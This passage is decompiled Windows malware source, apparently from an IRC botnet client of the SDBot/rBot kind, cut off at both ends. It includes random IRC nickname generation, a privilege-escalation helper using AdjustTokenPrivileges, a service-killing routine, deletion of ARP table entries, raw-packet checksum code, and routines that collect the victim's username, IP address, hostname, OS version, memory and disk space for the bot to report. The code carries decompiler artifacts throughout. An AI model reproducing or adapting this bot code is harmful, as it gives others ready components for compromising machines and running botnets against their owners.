            int num5 = (int) __calli(\u003CModule\u003E.fDeleteIpNetEntry)((_MIB_IPNETROW_LH*) mibIpnettablePtr3);
            ++num4;
            mibIpnettablePtr2 += 24;
          }
          while (num4 < (uint) *(int*) mibIpnettablePtr1);
          break;
        }
        break;
      case 50:
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D6, __arglist ());
        num2 = 0;
        break;
      case 122:
        mibIpnettablePtr1 = (_MIB_IPNETTABLE*) \u003CModule\u003E.malloc(num1);
        \u003CModule\u003E.memset((void*) mibIpnettablePtr1, 0, num1);
        if ((IntPtr) mibIpnettablePtr1 != IntPtr.Zero)
        {
          _MIB_IPNETTABLE* mibIpnettablePtr4 = mibIpnettablePtr1;
          ref uint local2 = ref num1;
          // ISSUE: function pointer call
          uint num6 = __calli(\u003CModule\u003E.fGetIpNetTable)((int) mibIpnettablePtr4, (uint*) ref local2, (_MIB_IPNETTABLE*) 1);
          if (num6 != 0U)
          {
            \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D3, __arglist ((int) num6));
            num2 = 0;
            break;
          }
          goto case 0;
        }
        else
        {
          \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D4, __arglist ());
          num2 = 0;
          break;
        }
      case 232:
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D5, __arglist ());
        num2 = 0;
        break;
      default:
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D7, __arglist ((int) num3));
        num2 = 0;
        break;
    }
    \u003CModule\u003E.free((void*) mibIpnettablePtr1);
    return num2;
  }

  internal static unsafe sbyte* GetIP(uint sock)
  {
    int num1 = 16;
    sockaddr sockaddr;
    \u003CModule\u003E.memset((void*) &sockaddr, 0, 16U);
    int num2 = (int) sock;
    ref sockaddr local1 = ref sockaddr;
    ref int local2 = ref num1;
    // ISSUE: function pointer call
    int num3 = __calli(\u003CModule\u003E.fgetsockname)((int*) num2, (sockaddr*) ref local1, (uint) ref local2);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    \u003CModule\u003E.sprintf((sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002E\u003FIP\u0040\u003F1\u003F\u003FGetIP\u0040\u0040YAPADI\u0040Z\u00404PADA, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D8, __arglist ((int) (byte) ^(sbyte&) ((IntPtr) &sockaddr + 4), (int) (byte) ^(sbyte&) ((IntPtr) &sockaddr + 5), (int) (byte) ^(sbyte&) ((IntPtr) &sockaddr + 6), (int) (byte) ^(sbyte&) ((IntPtr) &sockaddr + 7)));
    return (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002E\u003FIP\u0040\u003F1\u003F\u003FGetIP\u0040\u0040YAPADI\u0040Z\u00404PADA;
  }

  internal static unsafe ushort checksum(ushort* buffer, int size)
  {
    uint num1 = 0;
    if (size > 1)
    {
      uint num2 = ((uint) (size - 2) >> 1) + 1U;
      size = (int) num2 * -2 + size;
      do
      {
        num1 = (uint) *buffer + num1;
        ++buffer;
        --num2;
      }
      while (num2 > 0U);
    }
    if (size != 0)
      num1 = (uint) *(byte*) buffer + num1;
    uint num3 = (num1 >> 16) + (num1 & (uint) ushort.MaxValue);
    return (ushort) ~((int) (num3 >> 16) + (int) num3);
  }

  internal static unsafe ushort in_cksum(ushort* addr, int len)
  {
    int num1 = 0;
    ushort num2 = 0;
    ushort* numPtr = addr;
    int num3 = len;
    if (len > 1)
    {
      uint num4 = ((uint) (len - 2) >> 1) + 1U;
      num3 = len - ((int) num4 << 1);
      do
      {
        num1 = (int) *numPtr + num1;
        ++numPtr;
        --num4;
      }
      while (num4 > 0U);
    }
    if (num3 == 1)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(sbyte&) ref num2 = (sbyte) *(byte*) numPtr;
      num1 = (int) num2 + num1;
    }
    int num5 = (num1 >> 16) + (num1 & (int) ushort.MaxValue);
    return (ushort) ~((num5 >> 16) + num5);
  }

  internal static unsafe int AdjustPrivileges(char* pPriv, int add)
  {
    void* currentProcess = \u003CModule\u003E.GetCurrentProcess();
    void* voidPtr1;
    ref void* local1 = ref voidPtr1;
    // ISSUE: function pointer call
    if (__calli(\u003CModule\u003E.fOpenProcessToken)((void**) currentProcess, 40U, (void*) ref local1) == 0)
      return 0;
    char* chPtr = pPriv;
    _TOKEN_PRIVILEGES tokenPrivileges;
    // ISSUE: cast to a reference type
    ref _TOKEN_PRIVILEGES local2 = (_TOKEN_PRIVILEGES&) ((IntPtr) &tokenPrivileges + 4);
    // ISSUE: function pointer call
    if (__calli(\u003CModule\u003E.fLookupPrivilegeValue)((_LUID*) 0, chPtr, (char*) ref local2) == 0)
    {
      \u003CModule\u003E.CloseHandle(voidPtr1);
      return 0;
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref tokenPrivileges = 1;
    if (add != 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &tokenPrivileges + 12) = ^(int&) ((IntPtr) &tokenPrivileges + 12) | 2;
    }
    else
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &tokenPrivileges + 12) = ^(int&) ((IntPtr) &tokenPrivileges + 12) & -3;
    }
    void* voidPtr2 = voidPtr1;
    ref _TOKEN_PRIVILEGES local3 = ref tokenPrivileges;
    // ISSUE: function pointer call
    int num = __calli(\u003CModule\u003E.fAdjustTokenPrivileges)((uint*) voidPtr2, (_TOKEN_PRIVILEGES*) 0, (uint) ref local3, (_TOKEN_PRIVILEGES*) 0, 0, (void*) 0);
    \u003CModule\u003E.CloseHandle(voidPtr1);
    return num;
  }

  internal static unsafe int KillService(sbyte* szSvcName)
  {
    if (\u003CModule\u003E.ServiceDel(szSvcName) == 0)
      return 0;
    HKEY__* hkeyPtr1 = (HKEY__*) 0;
    uint num1 = 128;
    uint num2 = \u003CModule\u003E.strlen(szSvcName);
    char* chPtr1 = (char*) \u003CModule\u003E.@new(num2 > (uint) int.MaxValue ? uint.MaxValue : num2 << 1);
    sbyte* numPtr = szSvcName;
    char* chPtr2 = chPtr1;
    int num3 = (int) \u003CModule\u003E.wcslen(chPtr2);
    \u003CModule\u003E.MultiByteToWideChar(0U, 1U, numPtr, -1, chPtr2, num3);
    \u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040_W arrayTypeBy0BaaW;
    \u003CModule\u003E.swprintf((char*) &arrayTypeBy0BaaW, (char*) &\u003CModule\u003E.\u003FA0x38b67ec0\u002Eunnamed\u002Dglobal\u002D0, __arglist ((IntPtr) chPtr1));
    ref \u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040_W local1 = ref arrayTypeBy0BaaW;
    ref HKEY__* local2 = ref hkeyPtr1;
    // ISSUE: function pointer call
    int num4 = __calli(\u003CModule\u003E.fRegOpenKeyEx)((HKEY__**) -2147483646, (uint) ref local1, 0U, (char*) 131097, (HKEY__*) ref local2);
    HKEY__* hkeyPtr2 = hkeyPtr1;
    ref \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CB_W local3 = ref \u003CModule\u003E.\u003FA0x38b67ec0\u002Eunnamed\u002Dglobal\u002D1;
    \u0024ArrayType\u0024\u0024\u0024BY0EAA\u0040E arrayTypeBy0EaaE;
    ref \u0024ArrayType\u0024\u0024\u0024BY0EAA\u0040E local4 = ref arrayTypeBy0EaaE;
    ref uint local5 = ref num1;
    // ISSUE: function pointer call
    int num5 = __calli(\u003CModule\u003E.fRegQueryValueEx)((uint*) hkeyPtr2, (byte*) ref local3, (uint*) 0, (uint*) 0, (char*) ref local4, (HKEY__*) ref local5);
    return 1;
  }

  internal static unsafe int ServiceDel(sbyte* szSvcName) => 1;

  internal static unsafe sbyte* rndnickconst(sbyte* strbuf)
  {
    \u003CModule\u003E.srand(\u003CModule\u003E.GetTickCount());
    \u003CModule\u003E._snprintf(strbuf, 28U, (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D0, __arglist (out \u003CModule\u003E.nickconst));
    uint num = 6;
    do
    {
      \u003CModule\u003E._snprintf(strbuf, 28U, (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D1, __arglist ((IntPtr) strbuf, \u003CModule\u003E.rand() % 10));
      --num;
    }
    while (num > 0U);
    return strbuf;
  }

  internal static unsafe sbyte* rndnickletter(sbyte* strbuf)
  {
    \u003CModule\u003E.srand(\u003CModule\u003E.GetTickCount());
    int num1 = \u003CModule\u003E.rand() % 3 + 6;
    int num2 = 0;
    if (0 < num1)
    {
      do
      {
        *(sbyte*) (num2 + (IntPtr) strbuf) = (sbyte) (\u003CModule\u003E.rand() % 26 + 97);
        ++num2;
      }
      while (num2 < num1);
    }
    *(sbyte*) (num2 + (IntPtr) strbuf) = (sbyte) 0;
    return strbuf;
  }

  internal static unsafe sbyte* rndnickcomp(sbyte* strbuf) => (sbyte*) 0;

  internal static unsafe sbyte* rndnickcountry(sbyte* strbuf)
  {
    \u003CModule\u003E.srand(\u003CModule\u003E.GetTickCount());
    \u0024ArrayType\u0024\u0024\u0024BY09D arrayTypeBy09D;
    \u0024ArrayType\u0024\u0024\u0024BY09_W arrayTypeBy09W;
    \u003CModule\u003E.MultiByteToWideChar(0U, 1U, (sbyte*) &arrayTypeBy09D, -1, (char*) &arrayTypeBy09W, 10);
    \u003CModule\u003E.GetLocaleInfoW(2048U, 7U, (char*) &arrayTypeBy09W, 20);
    \u003CModule\u003E._snprintf(strbuf, 28U, (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D2, __arglist (out arrayTypeBy09D));
    uint num = 6;
    do
    {
      \u003CModule\u003E._snprintf(strbuf, 28U, (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D3, __arglist ((IntPtr) strbuf, \u003CModule\u003E.rand() % 10));
      --num;
    }
    while (num > 0U);
    return strbuf;
  }

  internal static unsafe sbyte* rndnickos(sbyte* strbuf)
  {
    sbyte* numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D4;
    _OSVERSIONINFOW osversioninfow;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref osversioninfow = 276;
    \u003CModule\u003E.GetVersionExW(&osversioninfow);
    \u003CModule\u003E.srand(\u003CModule\u003E.GetTickCount());
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ((IntPtr) &osversioninfow + 4) == 4)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(int&) ((IntPtr) &osversioninfow + 8) == 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 16) == 1)
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D5;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 16) == 2)
        {
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D6;
          goto label_18;
        }
        else
          goto label_18;
      }
      else
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 8) == 10)
        {
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D7;
          goto label_18;
        }
        else
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &osversioninfow + 8) == 90)
          {
            numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D8;
            goto label_18;
          }
        }
      }
    }
    else
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(int&) ((IntPtr) &osversioninfow + 4) == 5)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 8) == 0)
        {
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D9;
          goto label_18;
        }
        else
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &osversioninfow + 8) == 1)
          {
            numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D10;
            goto label_18;
          }
          else
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            if (^(int&) ((IntPtr) &osversioninfow + 8) == 2)
            {
              numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D11;
              goto label_18;
            }
          }
        }
      }
    }
    numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D12;
label_18:
    \u003CModule\u003E._snprintf(strbuf, 28U, (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D13, __arglist ((IntPtr) numPtr));
    uint num = 6;
    do
    {
      \u003CModule\u003E._snprintf(strbuf, 28U, (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D14, __arglist ((IntPtr) strbuf, \u003CModule\u003E.rand() % 10));
      --num;
    }
    while (num > 0U);
    return strbuf;
  }

  internal static unsafe sbyte* prefixnick(sbyte* strbuf)
  {
    uint num = \u003CModule\u003E.GetTickCount() / 86400000U;
    \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040D arrayTypeBy0BmD;
    if (num > 100U)
    {
      ref \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CB_W local = ref \u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D15;
      // ISSUE: function pointer call
      sbyte* numPtr = (IntPtr) __calli(\u003CModule\u003E.fFindWindow)((char*) ref local, (char*) 0) == IntPtr.Zero ? (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D17 : (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D16;
      \u003CModule\u003E._snprintf((sbyte*) &arrayTypeBy0BmD, 28U, (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D18, __arglist ((int) num, (IntPtr) numPtr));
    }
    else
    {
      ref \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CB_W local = ref \u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D19;
      // ISSUE: function pointer call
      sbyte* numPtr = (IntPtr) __calli(\u003CModule\u003E.fFindWindow)((char*) ref local, (char*) 0) == IntPtr.Zero ? (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D21 : (sbyte*) &\u003CModule\u003E.\u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D20;
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0BmD, numPtr, __arglist ());
    }
    if (\u003CModule\u003E.strlen((sbyte*) &arrayTypeBy0BmD) > 2U)
    {
      \u003CModule\u003E.strncat((sbyte*) &arrayTypeBy0BmD, strbuf, 28U);
      \u003CModule\u003E.strncpy(strbuf, (sbyte*) &arrayTypeBy0BmD, 28U);
    }
    return strbuf;
  }

  internal static unsafe sbyte* rndnick(sbyte* strbuf, int type, int prefix, sbyte* name)
  {
    int num1 = 0;
    RNICK* rnickPtr = (RNICK*) &\u003CModule\u003E.rnick;
    int num2 = 0;
    do
    {
      if ((IntPtr) name != IntPtr.Zero)
      {
        if (\u003CModule\u003E.strcmp(name, (sbyte*) rnickPtr) == 0)
          goto label_5;
      }
      else
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) (num2 + ((IntPtr) &\u003CModule\u003E.rnick + 12)) == type)
          goto label_5;
      }
      ++num1;
      num2 += 20;
      rnickPtr += 20;
    }
    while ((uint) num2 < 100U);
    goto label_6;
label_5:
    sbyte* numPtr1 = strbuf;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a function pointer type
    // ISSUE: function pointer call
    sbyte* numPtr2 = __calli((__FnPtr<sbyte* (sbyte*)>) ^(int&) (num1 * 20 + ((IntPtr) &\u003CModule\u003E.rnick + 16)))(numPtr1);
label_6:
    return prefix != 0 ? \u003CModule\u003E.prefixnick(strbuf) : strbuf;
  }

  internal static unsafe sbyte* Uptime(int startup)
  {
    uint num1 = \u003CModule\u003E.GetTickCount() / 1000U - (uint) startup;
    uint num2 = num1 % 86400U;
    \u003CModule\u003E._snprintf((sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002E\u003Fbuffer\u0040\u003F1\u003F\u003FUptime\u0040\u0040YAPADH\u0040Z\u00404PADA, 50U, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D0, __arglist ((int) (num1 / 86400U), (int) (num2 / 3600U), (int) (num2 % 3600U / 60U)));
    return (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002E\u003Fbuffer\u0040\u003F1\u003F\u003FUptime\u0040\u0040YAPADH\u0040Z\u00404PADA;
  }

  internal static unsafe sbyte* netinfo(sbyte* ninfo, sbyte* host, uint sock)
  {
    \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D arrayTypeBy0IaD;
    \u003CModule\u003E.memset((void*) &arrayTypeBy0IaD, 0, 128U);
    \u0024ArrayType\u0024\u0024\u0024BY07D arrayTypeBy07D;
    if (\u003CModule\u003E.nowininet == 0)
    {
      \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040_W arrayTypeBy0IaW;
      \u003CModule\u003E.MultiByteToWideChar(0U, 1U, (sbyte*) &arrayTypeBy0IaD, -1, (char*) &arrayTypeBy0IaW, 256);
      uint num;
      ref uint local1 = ref num;
      ref \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040_W local2 = ref arrayTypeBy0IaW;
      // ISSUE: function pointer call
      if (__calli(\u003CModule\u003E.fInternetGetConnectedStateEx)((uint) ref local1, (uint) ref local2, (char*) 128, (uint*) 0) == 0)
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D1, __arglist ());
      if (((int) num & 1) != 0)
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy07D, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D2, __arglist ());
      else
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy07D, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D3, __arglist ());
    }
    else
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy07D, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D4, __arglist ());
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D5, __arglist ());
    }
    \u003CModule\u003E._snprintf(ninfo, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D6, __arglist (out arrayTypeBy07D, out arrayTypeBy0IaD, (IntPtr) \u003CModule\u003E.GetIP(sock), (IntPtr) host));
    return ninfo;
  }

  internal static ulong GetCPUSpeed()
  {
    ulong num1;
    do
    {
      ulong cycleCount = \u003CModule\u003E.GetCycleCount();
      \u003CModule\u003E.Sleep(1000U);
      num1 = (\u003CModule\u003E.GetCycleCount() - cycleCount) / 1000000UL;
    }
    while (num1 > 1000000UL);
    ulong num2 = num1 % 100UL;
    ulong num3 = 100;
    if (num2 < 80UL)
      num3 = 75UL;
    if (num2 < 71UL)
      num3 = 66UL;
    if (num2 < 55UL)
      num3 = 50UL;
    if (num2 < 38UL)
      num3 = 33UL;
    if (num2 < 30UL)
      num3 = 25UL;
    if (num2 < 10UL)
      num3 = 0UL;
    return num3 - num2 + num1;
  }

  internal static unsafe sbyte* sysinfo(sbyte* sinfo, uint sock)
  {
    sbyte* numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D7;
    _OSVERSIONINFOW osversioninfow;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref osversioninfow = 276;
    \u003CModule\u003E.GetVersionExW(&osversioninfow);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ((IntPtr) &osversioninfow + 4) == 4)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(int&) ((IntPtr) &osversioninfow + 8) == 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 16) == 1)
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D8;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 16) == 2)
        {
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D9;
          goto label_24;
        }
        else
          goto label_26;
      }
      else
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 8) == 10)
        {
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D10;
          goto label_23;
        }
        else
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &osversioninfow + 8) == 90)
          {
            numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D11;
            goto label_23;
          }
        }
      }
    }
    else
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(int&) ((IntPtr) &osversioninfow + 4) == 5)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 8) == 0)
        {
          numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D12;
          goto label_23;
        }
        else
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &osversioninfow + 8) == 1)
          {
            numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D13;
            goto label_23;
          }
          else
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            if (^(int&) ((IntPtr) &osversioninfow + 8) == 2)
            {
              numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D14;
              goto label_23;
            }
          }
        }
      }
      else
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &osversioninfow + 4) == 6)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          if (^(int&) ((IntPtr) &osversioninfow + 8) == 0)
          {
            numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D15;
            goto label_23;
          }
          else
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            if (^(int&) ((IntPtr) &osversioninfow + 8) == 1)
            {
              numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D16;
              goto label_23;
            }
          }
        }
      }
    }
    numPtr = (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D17;
label_23:
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ((IntPtr) &osversioninfow + 16) != 2)
      goto label_26;
label_24:
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(ushort&) ((IntPtr) &osversioninfow + 20) != (ushort) 0)
    {
      \u0024ArrayType\u0024\u0024\u0024BY0IM\u0040D arrayTypeBy0ImD;
      // ISSUE: cast to a reference type
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0ImD, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D18, __arglist ((IntPtr) numPtr, (_OSVERSIONINFOW&) ((IntPtr) &osversioninfow + 20)));
      numPtr = (sbyte*) &arrayTypeBy0ImD;
    }
label_26:
    uint num1 = 256;
    \u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040_W arrayTypeBy0BaaW;
    // ISSUE: cpblk instruction
    __memcpy(ref arrayTypeBy0BaaW, ref \u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D19, 4);
    // ISSUE: cast to a reference type
    // ISSUE: initblk instruction
    __memset((\u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040_W&) ((IntPtr) &arrayTypeBy0BaaW + 4), 0, 508);
    if (\u003CModule\u003E.fGetUserName != null)
    {
      ref \u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040_W local1 = ref arrayTypeBy0BaaW;
      ref uint local2 = ref num1;
      // ISSUE: function pointer call
      int num2 = __calli(\u003CModule\u003E.fGetUserName)((uint*) ref local1, (char*) ref local2);
    }
    sbyte* ip = \u003CModule\u003E.GetIP(sock);
    // ISSUE: function pointer call
    uint num3 = __calli(\u003CModule\u003E.finet_addr)(ip);
    ref uint local = ref num3;
    // ISSUE: function pointer call
    hostent* hostentPtr = __calli(\u003CModule\u003E.fgethostbyaddr)((int) ref local, 4, (sbyte*) 2);
    \u0024ArrayType\u0024\u0024\u0024BY0PK\u0040D arrayTypeBy0PkD;
    if ((IntPtr) hostentPtr != IntPtr.Zero)
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0PkD, (sbyte*) *(int*) hostentPtr, __arglist ());
    else
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0PkD, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D20, __arglist ());
    \u0024ArrayType\u0024\u0024\u0024BY0BAE\u0040_W arrayTypeBy0BaeW;
    int systemDirectoryW = (int) \u003CModule\u003E.GetSystemDirectoryW((char*) &arrayTypeBy0BaeW, 520U);
    \u0024ArrayType\u0024\u0024\u0024BY0EG\u0040_W arrayTypeBy0EgW1;
    \u003CModule\u003E.GetDateFormatW(1033U, 0U, (_SYSTEMTIME*) 0, (char*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D21, (char*) &arrayTypeBy0EgW1, 70);
    \u0024ArrayType\u0024\u0024\u0024BY0EG\u0040_W arrayTypeBy0EgW2;
    \u003CModule\u003E.GetTimeFormatW(1033U, 0U, (_SYSTEMTIME*) 0, (char*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D22, (char*) &arrayTypeBy0EgW2, 70);
    _MEMORYSTATUS memorystatus;
    \u003CModule\u003E.memset((void*) &memorystatus, 0, 32U);
    \u003CModule\u003E.GlobalMemoryStatus(&memorystatus);
    \u0024ArrayType\u0024\u0024\u0024BY09_W arrayTypeBy09W;
    \u003CModule\u003E._wsplitpath((char*) &arrayTypeBy0BaeW, (char*) &arrayTypeBy09W, (char*) 0, (char*) 0, (char*) 0);
    DKSPKB dkspkb = \u003CModule\u003E.DiskSpaceKB((char*) &arrayTypeBy09W);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: cast to a reference type
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
